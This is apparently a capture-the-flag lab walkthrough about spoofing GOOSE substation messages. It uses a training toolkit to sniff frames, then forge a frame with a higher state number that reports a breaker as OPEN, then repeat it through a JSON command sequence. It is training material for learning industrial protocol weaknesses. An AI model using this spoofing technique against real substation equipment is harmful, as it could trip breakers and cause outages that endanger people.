# Challenge 5 — Second Blackout

**Protocol:** GOOSE training stream · **Port:** 6180/udp · **Toolkit module:** `goose`

---

## The Story

Imagine an electrical substation where a breaker controls the flow of electricity. A monitoring system uses GOOSE messages to share the breaker's state with other devices.

In this challenge, you'll listen to these messages and learn how the system identifies new information. Then, you'll use the SYSRUPT toolkit to send a frame that the training subscriber accepts as a newer state.

**Your mission:** Capture the GOOSE traffic, understand its sequence numbers, send a frame that changes the reported breaker state, and retrieve the flag.

The breaker sends messages to tell other devices whether it is OPEN or CLOSED.

Your job is to:
1. Listen to the messages.
2. Understand how the messages work.
3. Send a fake message saying the breaker is OPEN.
4. Make the receiver accept your fake message.

**Goal:** S
## What You Know

- **Target:** `10.0.1.1:6180` using UDP.
- The toolkit listens for incoming GOOSE training messages rather than actively probing the port.
- `APPID` identifies the application or message stream.
- `confRev` identifies the configuration revision.
- `stNum` identifies the current state and changes when that state changes.
- `sqNum` increases when the same state is retransmitted.
- The `sysrupt sequence` command runs multiple commands in order, with optional delays between them.

## About the Protocol — GOOSE

**GOOSE** stands for Generic Object Oriented Substation Event. It is used in electrical substations to share important status information, such as breaker states.

GOOSE messages can be repeated so that receiving devices continue to receive the latest state.

Two important fields are:

- **`stNum` (State Number):** Changes when the published state changes.
- **`sqNum` (Sequence Number):** Increases when the same state is retransmitted.

Think of `stNum` as the version of the current state and `sqNum` as the number of times that state has been repeated.

## Step 1: Listen and Capture the Real Traffic

### Hint

Don't guess `APPID`, `confRev`, or the current `stNum` and `sqNum`. Listen to the live traffic and read the values from the captured frames.

### Show command

```bash
./bin/sysrupt goose sniff --seconds 5
```

### What the command does

- `./bin/sysrupt` runs the SYSRUPT toolkit.
- `goose` selects the GOOSE module.
- `sniff` listens for incoming GOOSE training messages.
- `--seconds 5` tells the toolkit to listen for five seconds.

The output shows the frames received during that period, including their application ID, state number, sequence number, configuration revision, and breaker state.

## Step 2: Send a Frame with a New State Number

### Hint

The receiver checks whether a message represents a newer state.

If the observed `stNum` is `1`, the next state number would be `2`. In this challenge, the supplied example uses `6` as the state number, and the toolkit accepts that frame.

### Show command

```bash
./bin/sysrupt goose send --appid 0x0BB8 --stnum 6 \
  --confrev 1 --sqnum 0 --open
```

### What the command does

- `goose send` constructs and sends a GOOSE training frame.
- `--appid 0x0BB8` specifies the application ID observed in the capture.
- `--stnum 6` sets the state number in the outgoing frame.
- `--confrev 1` specifies the configuration revision.
- `--sqnum 0` sets the sequence number to zero for the new state.
- `--open` sets the breaker's reported state to open.

The example uses state number `6`, but the important lesson is to understand how the receiver evaluates state numbers rather than blindly copying an example.

## Step 3: Create a Sequence to Repeat the State

### Hint

Sometimes a single message is not enough to maintain a state. A sequence file lets you run several commands in order, with delays between them.

For repeated messages representing the same state, keep `stNum` the same and increase `sqNum`.

### Show command

Create a file named `goose-sustain.seq.json`:

```json
{
  "name": "goose-sustain",
  "description": "Repeated sends to maintain the reported state",
  "steps": [
    {
      "command": "goose send --appid 0x0BB8 --stnum 6 --confrev 1 --sqnum 0 --open"
    },
    {
      "command": "goose send --appid 0x0BB8 --stnum 6 --confrev 1 --sqnum 1 --open",
      "delay_before_ms": 300
    },
    {
      "command": "goose send --appid 0x0BB8 --stnum 6 --confrev 1 --sqnum 2 --open",
      "delay_before_ms": 300
    }
  ]
}
```

Validate the sequence:

```bash
./bin/sysrupt sequence validate goose-sustain.seq.json
```

Run it:

```bash
./bin/sysrupt sequence run goose-sustain.seq.json
```

### What the commands do

**Part 1: Create the sequence file**

- `"name"` gives the sequence a name.
- `"description"` explains what the sequence is intended to do.
- `"steps"` contains the commands to run, in order.
- `"command"` specifies a command for the toolkit to execute.
- `"delay_before_ms": 300` tells the sequence runner to wait 300 milliseconds before executing that step.

**Part 2: Validate the sequence**

```bash
./bin/sysrupt sequence validate goose-sustain.seq.json
```

This checks the sequence file and displays the commands that would run. Validation checks the sequence configuration; it does not execute the commands.

**Part 3: Run the sequence**

```bash
./bin/sysrupt sequence run goose-sustain.seq.json
```

This executes the commands in order and reports whether each step ran successfully.

In the example, all three frames use `stNum 6`, while their `sqNum` values are `0`, `1`, and `2`.

## What You Learned

- How to capture and read GOOSE training traffic.
- What `APPID`, `confRev`, `stNum`, and `sqNum` represent.
- How the state number differs from the sequence number.
- How to send a GOOSE training frame using the SYSRUPT toolkit.
- How to create, validate, and run a sequence file.
- Why successful command execution and successful protocol acknowledgment are not always the same thing.

**The key lesson:** GOOSE receivers use state and sequence information to decide whether a message is fresh. Understanding these fields helps explain how industrial devices process changing states and repeated messages.
